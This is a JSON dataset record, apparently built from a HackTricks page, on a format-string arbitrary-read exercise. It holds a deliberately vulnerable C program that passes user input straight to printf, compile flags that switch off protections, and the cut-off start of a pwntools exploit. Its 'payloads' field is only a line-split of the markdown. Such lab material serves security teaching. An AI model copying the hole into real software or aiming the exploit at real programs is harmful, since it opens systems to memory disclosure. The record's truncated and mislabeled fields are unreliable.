{
  "id": "binary_exploitation_72e9e7e6ecac",
  "category": "binary-exploitation",
  "title": "format strings arbitrary read example",
  "description": "# Format Strings - Arbitrary Read Example\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Read Binary Start\n\n### Code\n\n```c\n#include <stdio.h>\n\nint main(void) {\n    char buffer[30];\n\n    fgets(buffer, sizeof(buffer), stdin);\n\n    printf(buffer);\n    return 0;\n}\n```\n\nCompile it with:\n\n```python\nclang -o fs-read fs-read.c -Wno-format-security -no-pie\n```\n\n### Exploit\n\n```python\nfrom pwn import *\n\np = process('./fs-read')\n\npayload = f\"%11$s|||||\".encode()\npayload += p64(0x00400000)\n\np.sendli",
  "payloads": [
    "# Format Strings - Arbitrary Read Example",
    "{{#include ../../banners/hacktricks-training.md}}",
    "## Read Binary Start",
    "### Code",
    "#include <stdio.h>",
    "int main(void) {",
    "char buffer[30];",
    "fgets(buffer, sizeof(buffer), stdin);",
    "printf(buffer);",
    "return 0;",
    "Compile it with:",
    "```python",
    "clang -o fs-read fs-read.c -Wno-format-security -no-pie",
    "### Exploit",
    "```python"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/binary-exploitation/format-strings/format-strings-arbitrary-read-example.md"
  ]
}